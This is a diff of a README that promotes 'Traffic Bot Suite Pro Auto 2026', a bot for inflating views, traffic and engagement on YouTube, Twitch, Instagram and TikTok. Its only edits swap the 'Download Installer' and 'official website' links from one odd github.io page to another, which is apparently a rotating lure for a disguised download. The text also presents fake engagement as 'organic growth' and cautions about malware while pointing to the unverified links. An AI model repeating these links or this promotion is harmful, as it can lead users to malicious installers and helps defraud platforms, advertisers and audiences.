@@ -2,7 +2,7 @@
 
 Traffic Bot Suite Pro Auto 2026 is a comprehensive software package designed to automate and enhance your online presence through traffic generation, view boosting, and engagement optimization. This tool is tailored for content creators, marketers, and businesses looking to amplify their reach on platforms like YouTube, Twitch, Instagram, TikTok, and more. With its advanced algorithms and intuitive interface, it provides a seamless experience for increasing visibility and driving organic growth.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -57,6 +57,6 @@ A: We accept various payment methods including credit cards, PayPal, and cryptoc
 
 For the latest version of Traffic Bot Suite Pro Auto 2026, please visit the official download page:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides access to the installer and additional resources. Ensure you download only from trusted sources to avoid malware.
